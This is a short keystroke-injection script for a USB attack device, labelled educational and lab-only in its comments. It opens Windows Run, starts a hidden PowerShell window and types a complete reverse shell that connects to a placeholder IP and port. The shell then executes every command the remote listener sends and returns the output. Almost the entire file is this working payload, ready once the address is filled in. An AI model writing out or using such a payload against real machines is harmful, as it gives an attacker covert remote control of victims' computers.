REM Reverse Shell - Educational example of a reverse shell payload
REM EXTREMELY DANGEROUS - Use ONLY in isolated lab environments you control
REM Change IP and PORT to your listener before compiling

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 800
STRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP_HERE', YOUR_PORT_HERE); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
ENTER
